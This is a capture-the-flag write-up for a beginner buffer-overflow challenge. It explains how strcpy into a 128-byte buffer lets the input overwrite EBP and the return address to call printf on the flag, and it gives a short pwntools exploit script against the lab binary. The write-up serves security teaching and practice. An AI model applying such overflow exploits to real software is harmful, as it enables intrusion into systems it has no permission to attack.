# OverFlow0 - 100pt

### Challenge ###
> This should be easy. Overflow the correct buffer in this program and get a flag. Its also found in /problems/overflow-0_5_db665826dabb99c44758c97abfd8c4c6 on the shell server


### Hints ###
> Find a way to trigger the flag to printIf you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting. 

### Solution ###

>We have a program that asks a parameter from shell and use it in a vuln function.
In this function, the parameter is used to fill a 128 bytes buffer with strcpy.
Ok strcpy it's a vulnerable fuction so we can perform our exploit providing a string with lenght over 128 byte to perform an overflow by the buffer contained in vuln.
With this overflow we can trigger se signal function calling printf to print the flag.

### Executing the exploit ###
>In vuln function we have:

    
	void vuln(char *input){
        char buf[128];
        strcpy(buf, input);
    }
	
>so we have to provide 0x88 bytes of garbage before arriving to EBP.
Now we can use ebp like parameter to printf, so we provide for ebp flag's address, and then, we provide printf address to ret.

### Exploit: ###

    garbage = "\x90" * 0x88 #buffer size
    flag_addr = p32(0x0804A080)
    printf_addr = p32(0x08048460) 

    #Coocking exploit
    exploit = garbage + flag_addr + printf_addr

    #sending exploit
    p = process(['/problems/overflow-0_5_db665826dabb99c44758c97abfd8c4c6/vuln', exploit])
    p.interactive()